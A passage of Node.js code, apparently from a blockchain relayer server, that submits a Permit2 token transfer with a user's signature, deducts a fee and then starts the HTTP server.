    t.address.toLowerCase() === tokenAddress.toLowerCase()
  );
  
  if (!tokenInfo) throw new Error('Unsupported token');

  const feeAmount = calculateFeeAmount(amount, tokenInfo.decimals);
  const netAmount = BigInt(amount) - feeAmount;

  if (netAmount <= 0) throw new Error('Amount too small for fees');

  const txHash = await walletClient.writeContract({
    address: PERMIT2_ADDRESS,
    abi: PERMIT2_ABI,
    functionName: 'permitTransferFrom',
    args: [
      {
        token: tokenAddress,
        amount: BigInt(amount),
      },
      {
        to: SPENDER_CONTRACT,
        requestedAmount: netAmount,
      },
      owner,
      BigInt(nonce || '0'),
      BigInt(deadline || '0'),
      signature,
    ],
  });

  const receipt = await publicClient.waitForTransactionReceipt({
    hash: txHash,
  });

  return {
    tokenSymbol: tokenInfo.symbol,
    txHash: receipt.transactionHash,
    amount: amount.toString(),
    feeAmount: feeAmount.toString(),
    netAmount: netAmount.toString(),
  };
}

const PORT = process.env.PORT || 3001;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Relayer server running on port ${PORT} (0.0.0.0)`);
  console.log(`Health check: http://localhost:${PORT}/health`);
  console.log(`Contract: ${SPENDER_CONTRACT}`);
  console.log(`Fee: ${FEE_PERCENTAGE}% (min $${MIN_FEE_USD})`);
});
